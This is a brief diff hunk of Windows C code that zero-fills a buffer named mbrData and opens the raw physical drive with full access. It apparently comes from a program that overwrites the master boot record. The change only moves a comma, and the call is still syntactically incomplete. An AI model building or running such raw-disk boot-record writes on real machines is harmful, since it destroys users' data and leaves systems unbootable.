@@ -9,8 +9,8 @@ int main() {
     ZeroMemory(&mbrData, sizeof(mbrData));
 
     HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
-    GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
-    , NULL, OPEN_EXISTING, NULL, NULL)
+    GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
+     NULL, OPEN_EXISTING, NULL, NULL)
 
 
     try {
